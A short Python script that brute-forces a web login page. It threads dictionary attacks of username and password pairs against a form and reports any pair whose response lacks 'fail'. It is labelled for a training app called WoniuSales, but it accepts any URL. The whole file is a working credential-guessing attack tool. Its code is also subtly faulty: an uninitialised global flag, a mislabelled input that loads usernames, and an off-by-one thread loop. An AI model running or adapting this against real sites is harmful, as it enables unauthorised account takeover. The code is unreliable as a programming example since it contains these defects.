# -*- coding: utf-8 -*-
"""
网站爆破
"""
import threading
import requests

def blast_http(url, lists):
    global sign
    # url = 'http://192.168.150.203:8080/WoniuSales1.4/user/login'
    with open('../dict/password_top500.txt') as passwd:  # 打开字典文件并放到数组中
        pass_list = passwd.readlines()
    for username in lists:
        for password in pass_list:  # 开始遍历
            if not sign:  # 如果标志不是False
                data = {'username': username.split()[0], 'password': password.split()[0],
                        'verifycode': '0000'}  # 由于.split之后是列表类型，得转换成srt类型,所以得加[0]
                resp = requests.post(data=data, url=url)
                if 'fail' not in resp.text:  # 进行判断
                    print(f"疑似爆破成功\n用户名：{username.split()[0]}\n密码：{password.split()[0]}")
                    sign = True  # 如果爆破成功返回True标志
                    exit()
            else:
                exit()

if __name__ == '__main__':
    print('只针对woniusales的')
    url = input("请输入登录的url：")
    number = int(input("请输入线程数："))
    pwd_path = input("请指定密码本：")
    with open(pwd_path, mode='r', encoding='utf-8') as user:
        user_lists = user.readlines()
    lenth = len(user_lists)
    for i in range(0, number + 1):
        lists = [x for x in user_lists[i * (lenth // number):(i + 1) * (lenth // number)]]
        threading.Thread(target=blast_http, args=(url, lists)).start()